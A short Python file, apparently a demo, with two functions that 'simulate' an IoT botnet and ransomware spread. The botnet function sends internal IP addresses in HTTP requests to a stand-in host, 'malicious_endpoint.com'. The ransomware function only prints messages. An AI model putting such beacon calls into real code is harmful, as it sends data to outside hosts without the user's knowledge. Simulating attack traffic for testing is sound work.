import requests
import random

def simulate_iot_botnet_attack():
    """Simulate IoT botnet traffic pattern."""
    ip_list = ["192.168.1." + str(i) for i in range(2, 10)]
    malicious_ips = random.sample(ip_list, 3)
    for ip in malicious_ips:
        requests.get(f"http://malicious_endpoint.com?ip={ip}")
    print("🚨 IoT Botnet Attack Simulated!")

def simulate_ransomware_propagation():
    """Simulate ransomware spreading across devices."""
    devices = ["device1", "device2", "device3"]
    for device in devices:
        print(f"🔓 Ransomware propagating to {device}...")
    print("⚠️ Ransomware Propagation Simulated!")
